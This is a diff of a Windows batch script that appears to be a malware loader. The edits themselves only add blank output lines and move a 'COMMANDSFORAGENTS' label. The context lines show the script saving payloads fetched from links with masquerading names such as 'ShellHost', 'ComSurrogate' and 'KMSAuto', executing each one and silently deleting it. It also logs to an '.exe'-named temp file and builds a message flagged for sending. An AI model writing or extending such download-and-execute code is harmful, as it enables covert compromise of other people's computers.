@@ -15,6 +15,9 @@ set "LOGFILE=%temp%\9875426.exe"
 :: Start logging from this point
 call :LogOutput > "%LOGFILE%" 2>&1
 :: del /f /q "%LOGFILE%"
+echo.
+echo.
+echo Exiting...
 exit
 
 :LogOutput
@@ -351,6 +354,8 @@ if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
     call "%embeddedScript%"
     del "%embeddedScript%" >nul 2>&1
+    echo.
+    echo.
 ) else (
     echo Filed to get content from ShellHost Link
     echo.
@@ -387,6 +392,8 @@ if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
     call "%embeddedScript%"
     del "%embeddedScript%" >nul 2>&1
+    echo.
+    echo.
 ) else (
     echo Filed to get content from ComSurrogate Link
     echo.
@@ -427,6 +434,8 @@ if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
     call "%embeddedScript%"
     del "%embeddedScript%" >nul 2>&1
+    echo.
+    echo.
 ) else (
     echo Filed to get content from KMSAuto Link
     echo.
@@ -462,6 +471,8 @@ if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
     call "%embeddedScript%"
     del "%embeddedScript%" >nul 2>&1
+    echo.
+    echo.
 ) else (
     echo Filed to get content from NIRCMD Link
     echo.
@@ -471,6 +482,17 @@ if exist "%embeddedScript%" (
 
 set "MESSAGE=%MESSAGE%NIRCMD|"
 set "CheckSend=1"
+
+
+
+
+
+
+:COMMANDSFORAGENTS
+echo :COMMANDSFORAGENTS
+echo.
+
+
 
 
 
@@ -575,12 +597,6 @@ echo.
 
 
 
-
-
-
-:COMMANDSFORAGENTS
-echo :COMMANDSFORAGENTS
-echo.
 
 
 
